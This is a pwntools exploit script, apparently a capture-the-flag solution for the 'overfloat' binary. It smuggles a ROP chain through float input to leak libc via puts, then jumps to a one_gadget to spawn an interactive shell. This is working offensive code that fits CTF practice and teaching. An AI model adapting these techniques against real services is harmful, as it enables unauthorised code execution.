from pwn import *
import struct

# objdump -D overfloat | grep puts
putsPlt = 0x400690
# objdump -R overfloat | grep puts
putsGot = 0x602020
# ROPgadget --binary overfloat | grep "pop rdi"
popRdi = 0x400a83

startMain = 0x400993
# one_gadget libc-2.27.so
oneShot = 0x4f2c5

# https://docs.python.org/3/library/struct.html

target = remote("localhost", 12345)
# target = process("./overfloat")
# gdb.attach(target, gdbscript='b *0x400a14')

libc = ELF('libc-2.27.so')

def sendVal(x):
    v1 = x & 0xFFFFFFFF
    v2 = x >> 32
    # Has to be in big endian order to make it through atof
    target.sendline(str(struct.unpack('!f', v1.to_bytes(4, 'big'))[0]).encode('utf8'))
    target.sendline(str(struct.unpack('!f', v2.to_bytes(4, 'big'))[0]).encode('utf8'))

for i in range(7):
    sendVal(0xdeadbeefdeadbeef)

sendVal(popRdi)
sendVal(putsGot)
sendVal(putsPlt)
sendVal(startMain)

target.sendline(b"done")

print(target.recvuntil(b"BON VOYAGE!\n"))

leak = target.recv(6)
leak = u64(leak + b"\x00"*(8-len(leak)))
base = leak - libc.symbols['puts']

print(f"libc base : {hex(base)}")

for i in range(7):
    sendVal(0xdeadbeefdeadbeef)

sendVal(base + oneShot)

target.sendline('done')

target.interactive()